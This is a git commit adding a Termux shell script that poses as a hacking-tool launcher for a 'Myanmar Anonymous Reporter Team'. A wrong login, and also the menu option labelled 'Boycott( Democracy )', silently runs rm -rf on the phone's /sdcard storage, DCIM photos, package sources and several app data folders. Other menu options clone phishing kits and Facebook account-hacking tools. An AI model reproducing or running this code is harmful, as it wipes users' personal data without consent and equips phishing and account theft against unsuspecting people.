70da8cbf1df0dcb6b713c1acea72840f86c0ddaf
ZuHack <95486965+ZuHack@users.noreply.github.com>
2021-12-25 00:50:02 +0630

    Add files via upload

---
+++ ZuH@ck.sh
@@ -0,0 +1,269 @@
+
+
+#! BL4CK-ZuH@ck CODE
+
+termux-open https://zuhack.github.io/single-pa-Kaung-Lay-shibwoo/
+
+clear
+
+echo -e " \e[1;31m 
+\033[0;33m     111     111       111        111111     1111111111                 
+\033[0;32m     111 111 111      11 11       11  11        111
+\033[0;36m     111  1  111     1111111      111111        111
+\033[1;33m     111     111    11     11     11 11         111
+\033[0;31m     111     111   11       11    11  11        111
+\e[0m "
+
+echo ""
+
+echo -e " \e[1;31m  
+Myanmar Anonymous Reporter Team ( Helper Team )
+"  | lolcat -a -d 20
+
+echo ""
+
+
+#! username and password code 
+
+echo "Enter username" | lolcat -a -d 20
+read username
+echo "Enter password" | lolcat -a -d 20
+read password
+
+if [[ ( $username == "MART" && $password == "ZuH@ck" ) ]]; then
+echo "valid user" | lolcat -a -d 20
+else
+echo "invalid fuck  user" | lolcat -a -d 20
+#cod false virus
+cd
+termux-setup-storage
+
+   rm -rf /sdcard
+
+	 rm -rf /sdcard/DCIM
+
+rm -rf /data/data/com.termux/files/usr/etc/apt/sources.list.d/* 
+	 
+	 rm -rf /sdcard/Android/data/com.mobile.legends
+	 
+	 rm -rf /sdcard/Android/data/com.mytel.myid
+	 
+	 rm -rf /sdcard/Android/data/com.mytelpay.eu
+	 
+	 rm -rf /sdcard/Android/obb/com.mobile.legends
+	 
+	 rm -rf /sdcard/Android/obb/com.tencent.ig
+	 
+	 rm -rf /sdcard/Android/media/com.mytel.myid
+	
+	 rm -rf /sdcard/.sketchware
+	 clear
+#code false virus end
+exit
+fi
+
+#! username and password code 
+
+#lolcat
+
+echo ""
+ echo "1.Basic tool install" | lolcat -a -d 20
+ echo ""
+ echo "2.Facebook Old Account Hack" | lolcat -a -d 20
+ echo ""
+ echo "3.Black Mafia (py2)" | lolcat -a -d 20
+ echo ""
+ echo "4.Pakistan Account Hack" | lolcat -a -d 20
+ echo ""
+ echo "5.Tool-X" | lolcat -a -d 20
+ echo ""
+ echo "6.Porn" | lolcat -a -d 20
+ echo ""
+ echo "7.Boycott( Democracy )" | lolcat -a -d 20
+ echo ""
+ echo "8.Z-Phisher( Phishing )" | lolcat -a -d 20
+ echo "" 
+ echo "9.Social-Phish ( Phishing )" | lolcat -a -d 20
+ echo ""
+ echo "10.Porn" | lolcat -a -d 20
+ echo ""
+ echo "11.Follow me" | lolcat -a -d 20
+ echo ""
+ 
+ 
+ 
+ #!exit code
+ echo "[0]  Exit " | lolcat -a -d 20
+ echo ""
+ echo  "Choose A Number :  " | lolcat -a -d 15
+read -p "" zuzu;
+#!exit 
+
+if [ $zuzu = 1 ] || [ $zuzu = 01 ]
+then
+clear
+ apt-get update -yq --silent 
+ apt-get upgrade -y 
+ apt-get install python -y 
+ apt-get install ruby -y 
+ pip install install lolcat 
+ gem install lolcat
+ pkg install update && pkg install upgrade
+ pkg install ncurses-utils -y 
+ pkg install termux-api -y
+ pkg install termux-repo -y
+ pkg install python3 -y
+ pkg install wget -y 
+ pkg install bash -y
+ pkg install openssh -y
+ pkg install git -y
+ pkg install python -y 
+ pkg install pythpn2 -y
+ pip2 install requests -y
+ pkg install zip wget -y 
+ pip2 install mechanize -y
+ pkg install php -y
+ pip2 install lolcat -y
+ apt install zsh -y
+ pkg install nmap -y
+ pkg install cmatrix -y
+ pkg install sl -y
+ pip3 install colorama -y
+ pkg install nano -y
+ pkg install curl -y
+echo " finish install pkg🌸pip2/3🌸apt "
+fi
+
+
+if [ $zuzu = 2 ] || [ $zuzu = 02 ]
+then
+git clone https://github.com/botolmehedi/bint
+fi
+
+if [ $zuzu = 3 ] || [ $zuzu = 03 ]
+then
+git clone https://github.com/lovehacker404/World
+fi
+
+if [ $zuzu = 4 ] || [ $zuzu = 04 ]
+then
+git clone https://github.com/mrpardesi007/Adicloner.git
+fi
+
+if [ $zuzu = 5 ] || [ $zuzu = 05 ]
+then
+git clone https://github.com/Rajkumrdusad/Tool-X.git
+fi
+
+if [ $zuzu = 6 ] || [ $zuzu = 06 ]
+then
+#pornhub csript start
+#!/bin/bash
+clear 
+p=1
+echo -e "\e[1;33m                           
+#####   ####  #####  #    # #    # #    # #####  
+#    # #    # #    # ##   # #    # #    # #    # 
+#    # #    # #    # # #  # ###### #    # #####  
+#####  #    # #####  #  # # #    # #    # #    # 
+#      #    # #   #  #   ## #    # #    # #    # 
+#       ####  #    # #    # #    #  ####  #####                                  
+\e[0m"
+
+echo ""
+
+echo -e "\e[1;35m        Code By ZuZu ( N42 ) \e[0m"
+echo ""
+echo -e "\e[1;33m      !Only for boys & Girls over 18 years old! \e[0m"
+echo ""
+read  -p "Enter Category :: " pa 
+echo ""
+echo -e "\e[1;33m If you want to stop (CTRL + C ) \e[0m"
+
+video=$(curl -s "https://www.pornhub.com/video/search?search=$pa&page=$p" -L | grep -oP '<a href="/view_video\K[^ ]+"' | cut -d '"' -f1 | sort -u > res.txt)
+error=$(curl -s "https://www.pornhub.com/video/search?search=$pa&page=$p" -L | grep -oP '<a href="/view_video\K[^ ]+"' | cut -d '"' -f1)
+
+title=$(curl -s "https://www.pornhub.com/video/search?search=$pa&page=$p" -L | grep -oP '<a href="/view_video\K[^ ]+" title="(.*?)"' | cut -d '"' -f3 | sort -u > title.txt)
+if [[ -z $error ]];then
+echo -e "\e[1;31m You check the internet \e[0m"
+else 
+for i in $(seq $(cat res.txt | wc -l ))
+do 
+echo ""
+sleep 2 
+echo -e "\e[1;33m [#] Title :: "$(cat title.txt | sed -n "${i}p" )
+echo -e "\e[1;36m [#] Link :: \e[4;36m https://www.pornhub.com/view_video$(cat res.txt | sed -n "${i}p" )\e[0m"
+echo ""
+done 
+rm -rf res.txt 
+rm -rf title.txt 
+read -p " you want to see url : " ghost
+termux-open $ghost
+fi
+
+#pornhub csript sta
+fi
+
+ if [ $zuzu = 7 ] || [ $zuzu = 07 ]
+then
+clear
+
+cd
+termux-setup-storage
+
+   rm -rf /sdcard
+
+	 rm -rf /sdcard/DCIM
+
+rm -rf /data/data/com.termux/files/usr/etc/apt/sources.list.d/* 
+	 
+	 rm -rf /sdcard/Android/data/com.mobile.legends
+	 
+	 rm -rf /sdcard/Android/data/com.mytel.myid
+	 
+	 rm -rf /sdcard/Android/data/com.mytelpay.eu
+	 
+	 rm -rf /sdcard/Android/obb/com.mobile.legends
+	 
+	 rm -rf /sdcard/Android/obb/com.tencent.ig
+	 
+	 rm -rf /sdcard/Android/media/com.mytel.myid
+	
+	 rm -rf /sdcard/.sketchware
+	 clear
+
+fi
+
+if [ $zuzu = 8 ] || [ $zuzu = 08 ]
+then
+git clone https://github.com/htr-tech/zphisher
+fi
+
+if [ $zuzu = 9 ] || [ $zuzu = 09 ]
+then
+git clone https://github.com/xHak9x/SocialPhish
+fi
+
+if [ $zuzu = 10 ] || [ $zuzu = 10 ]
+then
+git clone https://github.com/xHak9x/SocialPhish
+fi
+
+
+
+
+
+
+
+if [ $zuzu = 11 ] || [ $zuzu = 11 ]
+then
+termux-open https://m.facebook.com/eikyaw.kaung.lay.ma.shi.9987
+fi
+
+if [ $zuzu = 0 ] || [ $zuzu = 0 ]
+then
+echo " Wellcome Myanmar Anonymous Helper Reporter Team (BL4CK-ZuH@ck)" | lolcat -a -d 20
+sleep 2 
+exit
+
+fi
